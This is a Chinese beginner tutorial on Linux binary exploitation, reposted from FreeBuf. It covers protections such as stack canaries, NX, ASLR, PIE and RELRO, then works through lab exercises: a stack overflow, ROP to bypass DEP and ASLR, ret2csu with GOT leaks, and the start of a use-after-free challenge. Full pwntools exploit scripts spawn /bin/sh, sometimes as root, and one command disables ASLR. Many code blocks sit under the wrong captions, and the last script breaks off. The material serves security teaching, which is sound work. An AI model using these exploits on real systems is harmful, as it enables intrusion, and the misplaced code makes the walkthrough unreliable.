\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/FKQivFsOGCX-09XCEZG\_Hg)

> **来自：FreeBuf.COM，作者：酒仙桥六号部队**
> 
> **链接：https://www.freebuf.com/vuls/248330.html**

PWN 是一个黑客语法的俚语词，自”own” 这个字引申出来的，意为玩家在整个游戏对战中处在胜利的优势。本文记录菜鸟学习 linux pwn 入门的一些过程，详细介绍 linux 上的保护机制，分析一些常见漏洞如栈溢出, 堆溢出，use after free 等, 以及一些常见工具介绍等。

Linux 程序的常用保护机制
---------------

先来学习一些关于 linux 方面的保护措施，操作系统提供了许多安全机制来尝试降低或阻止缓冲区溢出攻击带来的安全风险，包括 DEP、ASLR 等。从 checksec 入手来学习 linux 的保护措施。checksec 可以检查可执行文件各种安全属性，包括 Arch,RELRO,Stack,NX，PIE 等。

pip 安装 pwntools 后自带 checksec 检查 elf 文件.

```
checksec xxxx.soArch:     aarch64-64-littleRELRO:    Full RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabled
```

```
brew install binutils
```

*   另外笔者操作系统为 macOS, 一些常用的 linux 命令如 readelf 需要另外 brew install binutils 安装
    

```
wget https://github.com/slimm609/checksec.sh/archive/2.1.0.tar.gz
tar xvf 2.1.0.tar.gz
./checksec.sh-2.1.0/checksec --file=xxx
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibQkTyzibcAXgojWcNHB0MCYMeam5RoBcG2SYMZFSwbicORiafbUZCOGUj20L3L1ia3V1eiaiaUHJIk9Tag/640?wx_fmt=jpeg)

*   gdb 里 peda 插件里自带的 checksec 功能
    

```
gdb level4  //加载目标程序
gdb-peda$ checksec 
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

### CANNARY 金丝雀 (栈保护)/Stack protect / 栈溢出保护

栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让 shellcode 能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入 cookie 信息，当函数真正返回的时候会验证 cookie 信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将 cookie 信息给覆盖掉，导致栈保护检查失败而阻止 shellcode 的执行。在 Linux 中我们将 cookie 信息称为 canary / 金丝雀。gcc 在 4.2 版本中添加了 - fstack-protector 和 - fstack-protector-all 编译参数以支持栈保护功能，4.9 新增了 - fstack-protector-strong 编译参数让保护的范围更广。

开启命令如下:

```
gcc -o test test.c                       // 默认情况下，开启Canary保护
gcc -fno-stack-protector  -o test test.c //禁用栈保护
gcc -fstack-protector     -o test test.c //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码
```

### FORTIFY / 轻微的检查

fority 其实非常轻微的检查，用于检查是否存在缓冲区溢出的错误。适用情形是程序采用大量的字符串或者内存操作函数，如 memcpy，memset，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf，gets 以及宽字符的变体。FORTIFY\_SOURCE 设为 1，并且将编译器设置为优化 1(gcc -O1)，以及出现上述情形，那么程序编译时就会进行检查但又不会改变程序功能 开启命令如下:

```
gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码
```

看编译后的二进制汇编我们可以看到 gcc 生成了一些附加代码，通过对数组大小的判断替换 strcpy, memcpy, memset 等函数名，达到防止缓冲区溢出的作用。

### NX/DEP / 数据执行保护

数据执行保护 (DEP)（Data Execution Prevention） 是一套软硬件技术，能够在内存上执行额外检查以帮助防止在系统上运行恶意代码。在 Microsoft Windows XP Service Pack 2 及以上版本的 Windows 中，由硬件和软件一起强制实施 DEP。支持 DEP 的 CPU 利用一种叫做 NX(No eXecute) 不执行” 的技术识别标记出来的区域。如果发现当前执行的代码没有明确标记为可执行（例如程序执行后由病毒溢出到代码执行区的那部分代码），则禁止其执行，那么利用溢出攻击的病毒或网络攻击就无法利用溢出进行破坏了。如果 CPU 不支持 DEP，Windows 会以软件方式模拟出 DEP 的部分功能。NX 即 No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入 shellcode 时，程序会尝试在数据页面上执行指令，此时 CPU 就会抛出异常，而不是去执行恶意指令。

开启命令如下:

```
gcc -o test test.c                    // 默认情况下，不会开这个检查gcc -D\_FORTIFY\_SOURCE=1 -o test test.c // 较弱的检查gcc -D\_FORTIFY\_SOURCE=1 仅仅只会在编译时进行检查 (特别像某些头文件 #include <string.h>)\_FORTIFY\_SOURCE设为1，并且将编译器设置为优化1(gcc -O1)，以及出现上述情形，那么程序编译时就会进行检查但又不会改变程序功能gcc -D\_FORTIFY\_SOURCE=2 -o test test.c // 较强的检查gcc -D\_FORTIFY\_SOURCE=2 程序执行时也会有检查 (如果检查到缓冲区溢出，就终止程序)\_FORTIFY\_SOURCE设为2，有些检查功能会加入，但是这可能导致程序崩溃。
```

在 Windows 下，类似的概念为 DEP（数据执行保护），在最新版的 Visual Studio 中默认开启了 DEP 编译选项。

### ASLR (Address space layout randomization)

ASLR 是一种针对缓冲区溢出的安全保护技术，通过对**堆、栈、共享库映射**等线性区布局的随机化，通过增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的。如今 Linux、FreeBSD、Windows 等主流操作系统都已采用了该技术。此技术需要操作系统和软件相配合。ASLR 在 linux 中使用此技术后，杀死某程序后重新开启, 地址就会会改变

在 Linux 上 关闭 ASLR，切换至 root 用户，输入命令

```
gcc -o test test.c // 默认情况下，开启NX保护
gcc -z execstack -o test test.c // 禁用NX保护
gcc -z noexecstack -o test test.c // 开启NX保护
```

开启 ASLR，切换至 root 用户，输入命令

```
echo 0 > /proc/sys/kernel/randomize\_va\_space
```

上面的序号代表意思如下:

0 - 表示关闭进程地址空间随机化。

1 - 表示将 mmap 的基址，stack 和 vdso 页面随机化。

2 - 表示在 1 的基础上增加栈（heap）的随机化。

可以防范基于 Ret2libc 方式的针对 DEP 的攻击。ASLR 和 DEP 配合使用，能有效阻止攻击者在堆栈上运行恶意代码。

### PIE 和 PIC

PIE 最早由 RedHat 的人实现，他在连接起上增加了 - pie 选项，这样使用 - fPIE 编译的对象就能通过连接器得到位置无关可执行程序。fPIE 和 fPIC 有些不同。-fPIC 与 - fpic 都是在编译时加入的选项，用于生成**位置无关的代码 (Position-Independent-Code)**。这两个选项都是可以使代码在加载到内存时使用相对地址，所有对**固定地址的访问都通过全局偏移表 (GOT)** 来实现。-fPIC 和 - fpic 最大的区别在于是否对 GOT 的大小有限制。-fPIC 对 GOT 表大小无限制，所以如果在不确定的情况下，使用 - fPIC 是更好的选择。-fPIE 与 - fpie 是等价的。这个选项与 - fPIC/-fpic 大致相同，不同点在于：-fPIC 用于生成动态库，-fPIE 用与生成可执行文件。再说得直白一点：-fPIE 用来生成位置无关的可执行代码。

PIE 和 ASLR 不是一样的作用，ASLR 只能对堆、栈, libc 和 mmap 随机化，而不能对如代码段，数据段随机化，使用 PIE+ASLR 则可以对代码段和数据段随机化。区别是 ASLR 是系统功能选项，PIE 和 PIC 是编译器功能选项。联系点在于在开启 ASLR 之后，PIE 才会生效。

开启命令如下:

```
echo 2 > /proc/sys/kernel/randomize\_va\_space
```

### RELRO(read only relocation)

在很多时候利用漏洞时可以写的内存区域通常是黑客攻击的目标，尤其是存储函数指针的区域。而动态链接的 ELF 二进制文件使用称为全局偏移表（GOT）的查找表来动态解析共享库中的函数，GOT 就成为了黑客关注的目标之一，

GCC, GNU linker 以及 Glibc-dynamic linker 一起配合实现了一种叫做 relro 的技术: read only relocation。**大概实现就是由 linker 指定 binary 的一块经过 dynamic linker 处理过 relocation 之后的区域, GOT 为只读.** 设置符号重定向表为只读或在程序启动时就解析并绑定所有动态符号，从而减少对 GOT（Global Offset Table）攻击。如果 RELRO 为 “Partial RELRO”，说明我们对 GOT 表具有写权限。

开启命令如下:

```
gcc -o test test.c                 // 默认情况下，不开启PIE
gcc -fpie -pie -o test test.c     // 开启PIE，此时强度为1
gcc -fPIE -pie -o test test.c     // 开启PIE，此时为最高强度2
gcc -fpic -o test test.c         // 开启PIC，此时强度为1，不会开启PIE
gcc -fPIC -o test test.c         // 开启PIC，此时为最高强度2，不会开启PIE
```

开启 FullRELRO 后写利用时就不能复写 got 表。

pwn 工具常见整合
----------

### pwntools

pwntools 是一个二进制利用框架, 网上关于 pwntools 的用法教程很多，学好 pwntools 对于做漏洞的利用和理解漏洞有很好的帮助。可以利用 pwntools 库开发基于 python 的漏洞利用脚本。

### pycharm

pycharm 可以实时调试和编写攻击脚本，提高了写利用的效率。

在远程主机上执行

```
gcc -o test test.c              // 默认情况下，是Partial RELRO
gcc -z norelro -o test test.c   // 关闭，即No RELRO
gcc -z lazy -o test test.c      // 部分开启，即Partial RELRO
gcc -z now -o test test.c       // 全部开启
```

用 pycharm 工具开发 pwn 代码，远程连接程序进行 pwn 测试。需要设置环境变量 TERM=linux;TERMINFO=/etc/terminfo，并勾选 Emulate terminal in output coonsoole

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibQkTyzibcAXgojWcNHB0MCYibxicbzN1IeRpDtia5V1kFeyeCicVaSDic2iaTYSOc4jwBQkClpka6k2OHMA/640?wx_fmt=jpeg)

然后 pwntools 的 python 脚本使用远程连接

```
socat TCP4-LISTEN:10001,fork EXEC:./linux\_x64\_test1
```

### ida

```
p = remote('172.16.36.176', 10001)
```

当 pwntools 开发的 python 脚本暂停时，远程 ida 可以附加查看信息

### gdb 附加

```
...raw\_input() # for debug...p.interactive()
```

### gdb 插件枚举

1)PEDA - Python Exploit Development Assistance for GDB(https://github.com/longld/peda) 可以很清晰的查看到堆栈信息，寄存器和反汇编信息 git clone https://github.com/longld/peda.git~/panda/peda echo “source ~/panda/peda/peda.py” >> ~/.gdbinit

2)GDB Enhanced Features(https://github.com/hugsy/gef) peda 的增强版，因为它支持更多的架构 (ARM, MIPS, POWERPC…)，和更加强大的模块, 并且和 ida 联动。

3)libheap(查看堆信息) pip3 install libheap —verbose

### EDB 附加

EDB 是一个可视化的跨平台调试器，跟 win 上的 Ollydbg 很像。

### lldb 插件

voltron & lisa。一个拥有舒服的 ui 界面，一个简洁但又拥有实用功能的插件。

voltron 配合 tmux 会产生很好的效果，如下:

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibQkTyzibcAXgojWcNHB0MCYLHQRdCrBDgEmrxJibe5Z05Ev4Wd9yQgesdpZc7mDt9IDePB5lA7pTbA/640?wx_fmt=jpeg)

实践
--

通过几个例子来了解常见的几种保护手段和熟悉常见的攻击手法。实践平台 ubuntu 14.16\_x64

### 实践 1 栈溢出利用溢出改变程序走向

#### 编译测试用例

```
#!/usr/bin/python
# -\*- coding: UTF-8 -\*-
import pwn
...
# Get PID(s) of target. The returned PID(s) depends on the type of target:
m\_pid=pwn.proc.pidof(p)\[0\]
print("attach %d" % m\_pid)
pwn.gdb.attach(m\_pid) # 链接gdb调试，先在gdb界面按下n下一步返回python控制台enter继续(两窗口同步)

print("\\n##########sending payload##########\\n")
p.send(payload)

pwn.pause()
p.interactive()
```

检测如下:

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void callsystem()
{ system("/bin/sh"); }
void vulnerable\_function() {
    char buf\[128\];
    read(STDIN\_FILENO, buf, 512);
}
int main(int argc, char\*\* argv) {
    write(STDOUT\_FILENO, "Hello, World\\n", 13);
// /dev/stdin    fd/0
// /dev/stdout   fd/1
// /dev/stderr   fd/2
    vulnerable\_function();
}
编译方法：#!bashgcc -fno-stack-protector linux\_x64\_test1.c -o linux\_x64\_test1 -ldl //禁用栈保护
```

发现没有栈保护，没有 CANARY 保护

#### 生成构造的数据

这里用到一个脚本 pattern.py 来生成随机数据，来自这里

```
gdb-peda$ checksec linux\_x64\_test1
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

#### 获取到溢出偏移

用 lldb 进行调试

```
python2 pattern.py create 150
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
```

发现溢出字符串长度为 136+ret\_address

#### 获取 callsystem 函数地址

因为代码中存在辅助函数 callsystem，直接获取地址

```
panda@ubuntu:~/Desktop/test$ lldb linux\_x64\_test1
(lldb) target create "linux\_x64\_test1"
Current executable set to 'linux\_x64\_test1' (x86\_64).
(lldb) run
Process 117360 launched: '/home/panda/Desktop/test/linux\_x64\_test1' (x86\_64)
Hello, World
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
Process 117360 stopped
\* thread #1: tid = 117360, 0x00000000004005e7 linux\_x64\_test1\`vulnerable\_function + 32, name = 'linux\_x64\_test1', stop reason = signal SIGSEGV: invalid address (fault address: 0x0)
    frame #0: 0x00000000004005e7 linux\_x64\_test1\`vulnerable\_function + 32
linux\_x64\_test1\`vulnerable\_function:
->  0x4005e7 <+32>: retq

linux\_x64\_test1\`main:
    0x4005e8 <+0>:  pushq  %rbp
    0x4005e9 <+1>:  movq   %rsp, %rbp
    0x4005ec <+4>:  subq   $0x10, %rsp
(lldb) x/xg $rsp
0x7fffffffdd58: 0x3765413665413565

python2 pattern.py offset 0x3765413665413565
hex pattern decoded as: e5Ae6Ae7
```

#### 编写并测试利用\_提权

pwntools 是一个二进制利用框架，可以用 python 编写一些利用脚本，方便达到利用漏洞的目的，当然也可以用其他手段。

```
panda@ubuntu:~/Desktop/test$ nm linux\_x64\_test1|grep call
00000000004005b6 T callsystem
```

测试利用拿到 shell

```
import pwn

# p = pwn.process("./linux\_x64\_test1")
p = remote('172.16.36.174', 10002)
callsystem\_address = 0x00000000004005b6
payload="A"\*136 + pwn.p64(callsystem\_address)

p.send(payload)
p.interactive()
```

将二进制程序设置为服务端程序, 后续文章不再说明

```
panda@ubuntu:~/Desktop/test$ python test.py 
\[+\] Starting local process './linux\_x64\_test1': pid 117455
\[\*\] Switching to interactive mode
Hello, World
$ whoami
panda
```

测试远程程序

```
socat TCP4-LISTEN:10001,fork EXEC:./linux\_x64\_test1
```

如果这个进程是 root

```
panda@ubuntu:~/Desktop/test$ python test2.py 
\[+\] Opening connection to 127.0.0.1 on port 10001: Done
\[\*\] Switching to interactive mode
Hello, World
$ whoami
panda
```

测试远程程序，提权成功

```
sudo socat TCP4-LISTEN:10001,fork EXEC:./linux\_x64\_test1
```

### 实践 2 栈溢出通过 ROP 绕过 DEP 和 ASLR 防护

#### 编译测试用例

开启 ASLR 后, libc 地址会不断变化, 这里先不讨论怎么获取真实 system 地址，用了一个辅助函数打印 system 地址。

```
panda@ubuntu:~/Desktop/test$ python test.py 
\[+\] Opening connection to 127.0.0.1 on port 10001: Done
\[\*\] Switching to interactive mode
Hello, World
$ whoami
root
```

编译方法：

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>
void systemaddr()
{
    void\* handle = dlopen("libc.so.6", RTLD\_LAZY);
    printf("%p\\n",dlsym(handle,"system"));
    fflush(stdout);
}
void vulnerable\_function() {
    char buf\[128\];
    read(STDIN\_FILENO, buf, 512);
}
int main(int argc, char\*\* argv) {
    systemaddr();
    write(1, "Hello, World\\n", 13);
    vulnerable\_function();
}
```

检测如下:

```
#!bash
gcc -fno-stack-protector linux\_x64\_test2.c -o linux\_x64\_test2 -ldl //禁用栈保护
```

观察 ASLR，运行两次, 发现每次 libc 的 system 函数地址会变化，

```
gdb-peda$ checksec linux\_x64\_test2
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

#### ROP 简介

ROP 的全称为 Return-oriented programming（返回导向编程）, 是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行 DEP 和代码签名等）

#### 寻找 ROP

我们希望最后执行 system(“/bin/sh”)，缓冲区溢出后传入”/bin/sh” 的地址和函数 system 地址。我们想要的 x64 的 gadget 一般如下:

```
panda@ubuntu:~/Desktop/test$ ./linux\_x64\_test2 
0x7f9d7d71a390
Hello, World

panda@ubuntu:~/Desktop/test$ ./linux\_x64\_test2 
0x7fa84dc3d390
Hello, World
```

系统开启了 aslr，只能通过相对偏移来计算 gadget，在二进制中搜索，这里用到工具 ROPgadget

```
pop rdi  // rdi="/bin/sh"
ret      // call system\_addr

pop rdi  // rdi="/bin/sh"
pop rax  // rax= system\_addr
call rax // call system\_addr
```

获取二进制的链接

```
panda@ubuntu:~/Desktop/test$ ROPgadget --binary linux\_x64\_test2 --only "pop|sret"
Gadgets information
============================================================

Unique gadgets found: 0
```

在库中搜索 pop ret

```
panda@ubuntu:~/Desktop/test$ ldd linux\_x64\_test2
    linux-vdso.so.1 =>  (0x00007ffeae9ec000)
    libdl.so.2 => /lib/x86\_64-linux-gnu/libdl.so.2 (0x00007fdc0531f000)
    libc.so.6 => /lib/x86\_64-linux-gnu/libc.so.6 (0x00007fdc04f55000)
    /lib64/ld-linux-x86-64.so.2 (0x00007fdc05523000)
```

决定用 0x0000000000021102

在库中搜索 /bin/sh 字符串

```
panda@ubuntu:~/Desktop/test$ ROPgadget --binary /lib/x86\_64-linux-gnu/libc.so.6 --only "pop|ret" |grep rdi
0x0000000000020256 : pop rdi ; pop rbp ; ret
0x0000000000021102 : pop rdi ; ret
```

#### 构造利用并测试

这里实现两种 gadgets 实现利用目的，分别是 version1 和 version2

```
panda@ubuntu:~/Desktop/test$ ROPgadget --binary /lib/x86\_64-linux-gnu/libc.so.6 --string "/bin/sh"
Strings information
============================================================
0x000000000018cd57 : /bin/sh
```

最后测试如下:

```
#!/usr/bin/python
# -\*- coding: UTF-8 -\*-
import pwn

libc = pwn.ELF("./libc.so.6")
# p = pwn.process("./linux\_x64\_test2")
p = pwn.remote("127.0.0.1",10001)

systema\_addr\_str = p.recvuntil("\\n")
systema\_addr = int(systema\_addr\_str,16)  # now system addr

binsh\_static = 0x000000000018cd57
binsh2\_static = next(libc.search("/bin/sh"))

print("binsh\_static   = 0x%x" % binsh\_static)
print("binsh2\_static  = 0x%x" % binsh2\_static)

binsh\_offset = binsh2\_static - libc.symbols\["system"\] # offset = static1 - static2
print("binsh\_offset   = 0x%x" % binsh\_offset)

binsh\_addr = binsh\_offset + systema\_addr
print("binsh\_addr     = 0x%x" % binsh\_addr)

# version1
# pop\_ret\_static = 0x0000000000021102 # pop rdi ; ret

# pop\_ret\_offset = pop\_ret\_static - libc.symbols\["system"\]
# print("pop\_ret\_offset = 0x%x" % pop\_ret\_offset)

# pop\_ret\_addr = pop\_ret\_offset + systema\_addr
# print("pop\_ret\_addr   = 0x%x" % pop\_ret\_addr)

# payload="A"\*136 +pwn.p64(pop\_ret\_addr)+pwn.p64(binsh\_addr)+pwn.p64(systema\_addr)
# binsh\_addr      低   x64 第一个参数是rdi
# systema\_addr    高

# version2
pop\_pop\_call\_static = 0x0000000000107419 #  pop rax ; pop rdi ; call rax
pop\_pop\_call\_offset = pop\_pop\_call\_static - libc.symbols\["system"\]
print("pop\_pop\_call\_offset = 0x%x" % pop\_pop\_call\_offset)

pop\_pop\_call\_addr = pop\_pop\_call\_offset + systema\_addr
print("pop\_pop\_call\_addr    = 0x%x" % pop\_pop\_call\_addr)

payload="A"\*136 +pwn.p64(pop\_pop\_call\_addr)+pwn.p64(systema\_addr)+pwn.p64(binsh\_addr)
# systema\_addr      低   pop rax
# binsh\_addr        高   pop rdi

print("\\n##########sending payload##########\\n")
p.send(payload)
p.interactive()
```

### 实践 3 栈溢出去掉辅助函数

```
panda@ubuntu:~/Desktop/test$ python test2.py 
\[\*\] '/lib/x86\_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
\[+\] Starting local process './linux\_x64\_test2': pid 118889
binsh\_static   = 0x18cd57
binsh2\_static  = 0x18cd57
binsh\_offset   = 0x1479c7
binsh\_addr     = 0x7fc3018ffd57
pop\_ret\_offset = 0x-2428e
pop\_ret\_addr   = 0x7fc301794102

##########sending payload##########
\[\*\] Switching to interactive mode
Hello, World
$ whoami
panda
```

检查防护

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vulnerable\_function() {
    char buf\[128\];
    read(STDIN\_FILENO, buf, 512);
}
int main(int argc, char\*\* argv) {
    write(STDOUT\_FILENO, "Hello, World\\n", 13);
    vulnerable\_function();
}
编译方法：gcc -fno-stack-protector linux\_x64\_test3.c -o linux\_x64\_test3 -ldl //禁用栈保护
```

#### .bss 段

相关概念：堆 (heap)，栈 (stack)，BSS 段，数据段 (data)，代码段 (code /text)，全局静态区，文字常量区，程序代码区。

BSS 段：BSS 段（bss segment）通常是指用来存放程序中未初始化的全局变量的一块内存区域。

数据段：数据段（data segment）通常是指用来存放程序中已初始化的全局变量的一块内存区域。

代码段：代码段（code segment/text segment）通常是指用来存放程序执行代码的一块内存区域。这部分区域的大小在程序运行前就已经确定，并且内存区域通常属于只读, 某些架构也允许代码段为可写，即允许修改程序。在代码段中，也有可能包含一些只读的常数变量，例如字符串常量等。

堆（heap）：堆是用于存放进程运行中被动态分配的内存段，它的大小并不固定，可动态扩张或缩减。当进程调用 malloc 等函数分配内存时，新分配的内存就被动态添加到堆上（堆被扩张）；当利用 free 等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）。

栈 (stack)：栈又称堆栈，用户存放程序临时创建的局部变量。在函数被调用时，其参数也会被压入发起调用的进程栈中，并且待到调用结束后，函数的返回值也会被存放回栈中。由于栈的后进先出特点，所以栈特别方便用来保存 / 恢复调用现场。

程序的. bss 段中. bss 段是用来保存全局变量的值的，地址固定，并且可以读可写。

<table><thead><tr><th width="39">Name</th><th width="36">Type</th><th width="49">Addr</th><th width="26">Off</th><th>Size</th><th>ES</th><th>Flg</th><th>Lk</th><th>Inf</th><th>Al</th></tr></thead><tbody><tr><td width="18">名字</td><td width="43">类型</td><td width="56">起始地址</td><td width="33">文件的偏移地址</td><td>区大小</td><td>表区的大小</td><td>区标志</td><td>相关区索引</td><td>其他区信息</td><td>对齐字节数</td></tr></tbody></table>

```
gdb-peda$ checksec linux\_x64\_test3
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
gdb-peda$ quit
```

#### 寻找合适的 gadget

```
panda@ubuntu:~/Desktop/test$ readelf -S linux\_x64\_test3
There are 31 section headers, starting at offset 0x1a48:

Section Headers:
  \[Nr\] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  \[24\] .got.plt          PROGBITS         0000000000601000  00001000
       0000000000000030  0000000000000008  WA       0     0     8
  \[25\] .data             PROGBITS         0000000000601030  00001030
       0000000000000010  0000000000000000  WA       0     0     8
  \[26\] .bss              NOBITS           0000000000601040  00001040
       0000000000000008  0000000000000000  WA       0     0     1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), l (large)
  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)
  O (extra OS processing required) o (OS specific), p (processor specific)
```

程序自己的 \_\_libc\_csu\_init 函数，没开 PIE.

疑问:

1.  这里可以直接 write 出 got\_system 吗？既然都得到 got\_write 这个是静态地址，还能去调用，难道 got 表函数随便调用不变？got\_system 存储了实际的 libc-2.23.so!write 地址，所以去执行 got\_system 然后打印出实际地址
    
    ![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ibQkTyzibcAXgojWcNHB0MCYTMeyBT2ONl7pkprwUxm1NC5ZcYSmCLufSho8pOX3GcL1eTs9OdHia1g/640?wx_fmt=jpeg)
    
2.  为什么不传递 “/bin/sh” 的字符串地址到最后调用的 system(“/bin/sh”), 而是将”/bin/sh” 写入 bss 段 因为这里 rdi=r15d=param1 r15d 32-bit 所以不能传递给 rdi 64-bit 的 “/bin/sh” 字符串地址，所以必须写入到可写 bss 段，因为程序段就 32-bit
    

```
panda@ubuntu:~/Desktop/test$ objdump -d linux\_x64\_test3
00000000004005c0 <\_\_libc\_csu\_init>:
  4005c0:    41 57                    push   %r15
  4005c2:    41 56                    push   %r14
  4005c4:    41 89 ff                 mov    %edi,%r15d
  4005c7:    41 55                    push   %r13
  4005c9:    41 54                    push   %r12
  4005cb:    4c 8d 25 3e 08 20 00     lea    0x20083e(%rip),%r12        # 600e10 <\_\_frame\_dummy\_init\_array\_entry>
  4005d2:    55                       push   %rbp
  4005d3:    48 8d 2d 3e 08 20 00     lea    0x20083e(%rip),%rbp        # 600e18 <\_\_init\_array\_end>
  4005da:    53                       push   %rbx
  4005db:    49 89 f6                 mov    %rsi,%r14
  4005de:    49 89 d5                 mov    %rdx,%r13
  4005e1:    4c 29 e5                 sub    %r12,%rbp
  4005e4:    48 83 ec 08              sub    $0x8,%rsp
  4005e8:    48 c1 fd 03              sar    $0x3,%rbp
  4005ec:    e8 0f fe ff ff           callq  400400 <\_init>
  4005f1:    48 85 ed                 test   %rbp,%rbp
  4005f4:    74 20                    je     400616 <\_\_libc\_csu\_init+0x56>
  4005f6:    31 db                    xor    %ebx,%ebx
  4005f8:    0f 1f 84 00 00 00 00     nopl   0x0(%rax,%rax,1)
  4005ff:    00 

  400600:    4c 89 ea                 mov    %r13,%rdx
  400603:    4c 89 f6                 mov    %r14,%rsi
  400606:    44 89 ff                 mov    %r15d,%edi
  400609:    41 ff 14 dc              callq  \*(%r12,%rbx,8)
  40060d:    48 83 c3 01              add    $0x1,%rbx
  400611:    48 39 eb                 cmp    %rbp,%rbx
  400614:    75 ea                    jne    400600 <\_\_libc\_csu\_init+0x40>
  400616:    48 83 c4 08              add    $0x8,%rsp

  40061a:    5b                       pop    %rbx
  40061b:    5d                       pop    %rbp
  40061c:    41 5c                    pop    %r12
  40061e:    41 5d                    pop    %r13
  400620:    41 5e                    pop    %r14
  400622:    41 5f                    pop    %r15
  400624:    c3                       retq   
  400625:    90                       nop
  400626:    66 2e 0f 1f 84 00 00     nopw   %cs:0x0(%rax,%rax,1)
  40062d:    00 00 00
```

```
00007f76:f3c0bd57|2f 62 69 6e 2f 73 68 00 65                     |/bin/sh.e       |
```

总结:

> 返回到 0x40061a 控制`rbx,rbp,r12,r13,r14,r15`
> 
> 返回到 0x400600 执行`rdx=r13 rsi=r14 rdi=r15d call callq *(%r12,%rbx,8)`
> 
> 使 rbx=0 这样最后就可以`callq *(r12+rbx*8)`\=`callq *(r12)`可以构造 rop 使之能执行任意函数
> 
> 需要泄露真实 libc.so 在内存中的地址才能拿到 system\_addr, 才能 getshell, 那么返回调用`got_write(rdi=1,rsi=got_write,rdx=8)`，从服务端返回 write\_addr，通过 write\_addr 减去 - write\_static/libc.symbols\[‘write’\] 和 system\_static/libc.symbols\[‘system’\] 的差值得到 system\_addr，然后返回到 main 重新开始，但并没有结束进程
> 
> 返回调用 got\_read(rdi=0,bss\_addr,16), 相当于执行`got_read(rdi=0,bss_addr,8)`,`got_read(rdi=0,bss_addr+8,8)`, 发送 system\_addr,”/bin/sh”, 然后返回到 main 重新开始，但并没有结束进程
> 
> 返回到 bss\_addr(bss\_addr+8) -> system\_addr(binsh\_addr)

#### 开始构造 ROP

查看 got 表

```
// /dev/stdin    fd/0
// /dev/stdout   fd/1
// /dev/stderr   fd/2
```

然后利用代码如下:

```
panda@ubuntu:~/Desktop/test$ objdump -R linux\_x64\_test3

linux\_x64\_test3:     file format elf64-x86-64

DYNAMIC RELOCATION RECORDS
OFFSET           TYPE              VALUE 
0000000000600ff8 R\_X86\_64\_GLOB\_DAT  \_\_gmon\_start\_\_
0000000000601018 R\_X86\_64\_JUMP\_SLOT  write@GLIBC\_2.2.5
0000000000601020 R\_X86\_64\_JUMP\_SLOT  read@GLIBC\_2.2.5
0000000000601028 R\_X86\_64\_JUMP\_SLOT  \_\_libc\_start\_main@GLIBC\_2.2.5
```

### 实践 4\_释放后使用（Use-After-Free）学习

用 2016HCTF\_fheap 作为学习目标，该题存在格式化字符漏洞和 UAF 漏洞。格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数。格式化字符漏洞是控制第一个参数可能导致任意地址读写。释放后使用（Use-After-Free）漏洞是内存块被释放后，其对应的指针没有被设置为 NULL, 再次申请内存块特殊改写内存导致任意地址读或劫持控制流。

#### 分析程序

checksec 查询发现全开了

```
#!/usr/bin/python
# -\*- coding: UTF-8 -\*-

from pwn import \*

libc\_elf = ELF("/lib/x86\_64-linux-gnu/libc.so.6")
linux\_x64\_test3\_elf = ELF("./linux\_x64\_test3")

# p = process("./linux\_x64\_test3")
p = remote("127.0.0.1",10001)

pop\_rbx\_rbp\_r12\_r13\_r14\_r15\_ret = 0x40061a
print("\[+\] pop\_rbx\_rbp\_r12\_r13\_r14\_r15\_ret = 0x%x" % pop\_rbx\_rbp\_r12\_r13\_r14\_r15\_ret)
rdx\_rsi\_rdi\_callr12\_ret = 0x400600
print("\[+\] rdx\_rsi\_rdi\_callr12\_ret = 0x%x" %  rdx\_rsi\_rdi\_callr12\_ret)

"""
